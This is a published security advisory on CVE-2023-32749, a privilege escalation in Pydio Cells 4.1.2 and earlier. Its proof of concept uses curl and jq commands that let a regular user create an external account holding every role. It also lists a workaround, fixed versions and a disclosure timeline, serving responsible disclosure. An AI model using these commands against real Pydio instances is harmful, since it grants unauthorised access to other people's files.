@@ -1,0 +1,225 @@
+id: 38747
+date: 05/31/2023
+title: Pydio Cells 4.1.2 - Unauthorised Role Assignments Vulnerability
+author: RedTeam
+cves: CVE-2023-32749
+
+Exploit Title: Pydio Cells 4.1.2 - Unauthorised Role Assignments
+Affected Versions: 4.1.2 and earlier versions
+Fixed Versions: 4.2.0, 4.1.3, 3.0.12
+Vulnerability Type: Privilege Escalation
+Security Risk: high
+Vendor URL: https://pydio.com/
+Vendor Status: notified
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-003
+Advisory Status: published
+CVE: CVE-2023-32749
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32749
+
+
+Introduction
+============
+
+"Pydio Cells is an open-core, self-hosted Document Sharing and
+Collaboration platform (DSC) specifically designed for organizations
+that need advanced document sharing and collaboration without security
+trade-offs or compliance issues."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+Users can share cells or folders with other users on the same Pydio
+instance. The web application allows to either select an already
+existing user from a list or to create a new user by entering a new
+username and password, if this functionality is enabled. When creating a
+new user in this way, a HTTP PUT request like the following is sent:
+
+------------------------------------------------------------------------
+PUT /a/user/newuser HTTP/2
+Host: example.com
+User-Agent: agent
+Authorization: Bearer O48gvjD[...]
+Content-Type: application/json
+Content-Length: 628
+Cookie: token=AO[...]
+
+{
+  "Attributes": {
+    "profile": "shared",
+    "parameter:core.conf:lang": "\"en-us\"",
+    "send_email": "false"
+  },
+  "Roles": [],
+  "Login": "newuser",
+  "Password": "secret!",
+  "GroupPath": "/",
+  "Policies": [...]
+}
+------------------------------------------------------------------------
+
+The JSON object sent in the body contains the username and password
+for the user to be created and an empty list for the key "Roles". The
+response contains a JSON object similar to the following:
+
+------------------------------------------------------------------------
+{
+  "Uuid": "58811c4c-2286-4ca0-8e8a-14ab9dbca8ce",
+  "GroupPath": "/",
+  "Attributes": {
+    "parameter:core.conf:lang": "\"en-us\"",
+    "profile": "shared"
+  },
+  "Roles": [
+    {
+      "Uuid": "EXTERNAL_USERS",
+      "Label": "External Users",
+      "Policies": [...]
+    },
+    {
+      "Uuid": "58811c4c-2286-4ca0-8e8a-14ab9dbca8ce",
+      "Label": "User newuser",
+      "UserRole": true,
+      "Policies": [...]
+    }
+  ],
+  "Login": "newuser",
+  "Policies": [....],
+  "PoliciesContextEditable": true
+}
+------------------------------------------------------------------------
+
+The key "Roles" now contains a list with two objects, which seem to be
+applied by default. The roles list in the HTTP request can be
+modified to contain a list of all available UUIDs for roles, which can
+be obtained by using the user search functionality. This results in a
+new user account with all roles applied. By performing a login as the
+newly created user, access to all cells and non-personal workspaces of
+the whole Pydio instance is granted.
+
+
+Proof of Concept
+================
+
+Login to the Pydio Cells web interface with a regular user and retrieve
+the JWT from the HTTP requests. This can either be done using an HTTP
+attack proxy or using the browser's developer tools. Subsequently, curl [1]
+can be used as follows to retrieve a list of all users and their roles:
+
+------------------------------------------------------------------------
+$ export JWT="<insert JWT here>"
+$ curl --silent \
+--header "Authorization: Bearer $TOKEN" \
+--header 'Content-Type: application/json' \
+--data '{}' \
+https://example.com/a/user | tee all_users.json
+
+{"Users":[...]}
+------------------------------------------------------------------------
+
+Afterwards, jq [2] can be used to create a JSON document which can be
+sent to the Pydio REST-API in order to create the external user "foobar"
+with the password "hunter2" and all roles assigned:
+
+------------------------------------------------------------------------
+$ jq '.Users[].Roles' all_users.json \
+| jq -s 'flatten | .[].Uuid | {Uuid: .}' \
+| jq -s 'unique' \
+| jq '{"Login": "foobar", "Password": "hunter2", "Attributes":
+{"profile": "shared"}, "Roles": .}' \
+| tee create_user.json
+
+{
+  "Login": "foobar",
+  "Password": "hunter2",
+  "Attributes": {
+    "profile": "shared"
+  },
+  "Roles": [...]
+}
+------------------------------------------------------------------------
+
+Finally, the following curl command can be issued to create the new external
+user:
+
+------------------------------------------------------------------------
+$ curl --request PUT \
+--silent \
+--header "Authorization: Bearer $JWT" \
+--header 'Content-Type: application/json' \
+--data @create_user.json \
+https://example.com/a/user/foobar
+------------------------------------------------------------------------
+
+Now, login with the newly created user to access all cells and
+non-personal workspaces.
+
+Workaround
+==========
+
+Disallow the creation of external users in the authentication settings.
+
+
+Fix
+===
+
+Upgrade Pydio Cells to a version without the vulnerability.
+
+
+Security Risk
+=============
+
+Attackers with access to any regular user account for a Pydio Cells instance can
+extend their privileges by creating a new external user with all roles
+assigned. Subsequently, they can access all folders and files in any
+cell and workspace, except for personal workspaces. The creation of
+external users is activated by default. Therefore, the vulnerability is
+estimated to pose a high risk.
+
+
+Timeline
+========
+
+2023-03-23 Vulnerability identified
+2023-05-02 Customer approved disclosure to vendor
+2023-05-02 Vendor notified
+2023-05-03 CVE ID requested
+2023-05-08 Vendor released fixed version
+2023-05-14 CVE ID assigned
+2023-05-16 Vendor asks for a few more days before the advisory is released
+2023-05-30 Advisory released
+
+
+References
+==========
+
+[1] https://curl.se/
+[2] https://stedolan.github.io/jq/
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
+
+
+Working at RedTeam Pentesting
+=============================
+
+RedTeam Pentesting is looking for penetration testers to join our team
+in Aachen, Germany. If you are interested please visit:
+https://jobs.redteam-pentesting.de/
+
+#  0day.today [2023-06-08]  #
